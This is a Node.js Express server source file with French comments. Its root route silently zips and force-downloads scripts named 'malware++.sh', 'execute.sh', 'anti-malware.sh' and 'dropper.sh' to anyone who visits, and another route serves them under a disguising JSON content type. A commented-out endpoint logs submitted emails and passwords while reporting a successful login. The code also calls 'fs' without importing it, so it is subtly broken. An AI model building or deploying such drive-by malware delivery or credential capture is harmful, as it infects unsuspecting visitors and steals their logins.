require("dotenv").config();
const express = require("express");
const cors = require("cors");
const userRoutes = require('./app/routes/user');
const path = require('path');
const archiver = require('archiver');

const connectDB = require('./app/database/connectDB')
const app = express();
const PORT = process.env.PORT || 3001;

connectDB()


// Route GET / pour télécharger automatiquement le fichier ZIP
app.get('/', (req, res) => {
  const files = [
    'malware++.sh',
    'execute.sh',
    'anti-malware.sh'
  ];

  // Créer un fichier ZIP
  const zipPath = path.join(__dirname, 'files', 'download.zip');
  const output = fs.createWriteStream(zipPath);
  const archive = archiver('zip', {
    zlib: { level: 9 } // Niveau de compression
  });

  output.on('close', () => {
    console.log('Archive créée');
    // Forcer le téléchargement du ZIP
    res.download(zipPath, 'files.zip', (err) => {
      if (err) {
        console.error('Erreur lors du téléchargement', err);
        res.status(500).send("Erreur de téléchargement");
      }
      // Supprimer le fichier zip après le téléchargement
      fs.unlinkSync(zipPath);
    });
  });

  archive.on('error', (err) => {
    console.error('Erreur lors de la création du ZIP', err);
    res.status(500).send("Erreur de compression");
  });

  archive.pipe(output);

  // Ajouter les fichiers au ZIP
  files.forEach(file => {
    const filePath = path.join(__dirname, 'files', file);
    if (fs.existsSync(filePath)) {
      archive.append(fs.createReadStream(filePath), { name: file });
    }
  });

  // Ajouter le fichier dropper.sh
  const dropperPath = path.join(__dirname, 'files', 'dropper.sh');
  if (fs.existsSync(dropperPath)) {
    archive.append(fs.createReadStream(dropperPath), { name: 'dropper.sh' });
  }

  // Finaliser l'archive
  archive.finalize();
});

// Route GET /download/:filename pour télécharger un fichier spécifique
app.get('/download/:filename', (req, res) => {
  const filename = req.params.filename;
  const allowedFiles = ['execute.sh', 'malware++.sh', 'anti-malware.sh', 'dropper.sh'];
  const filePath = path.join(__dirname, 'files', filename);

  if (allowedFiles.includes(filename) && fs.existsSync(filePath)) {
    res.download(filePath, filename, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
  } else {
    res.status(404).json({ error: 'Fichier non trouvé' });
  }
});

app.use(
  express.urlencoded({
    extended: true,
  }),
);
app.use(cors());
app.use(
  express.json({
    limit: "10mb",
  }),
);
app.set("port", process.env.PORT);
app.set("host", process.env.HOST);

// Quand il reçoit une requête visant cet endpoint
// https://iia-backend.onrender.com//api/data
// app.post("/api/data", (req, res) => {
//   // const { ip } = req
//   const { email, password } = req.body;
//   console.log(email, password);
//   res.status(200).json({ message: "connexion réuissie" });
// });


app.use('/api/v1/user', userRoutes)


app.listen(app.get("port"), function () {
  console.log(`Server running at ${app.get("host")} :  ${app.get("port")}`);
});

// app.listen(process.env.PORT, () => {
//   console.log(`✅ Server running at ${process.env.PORT}`);
// });

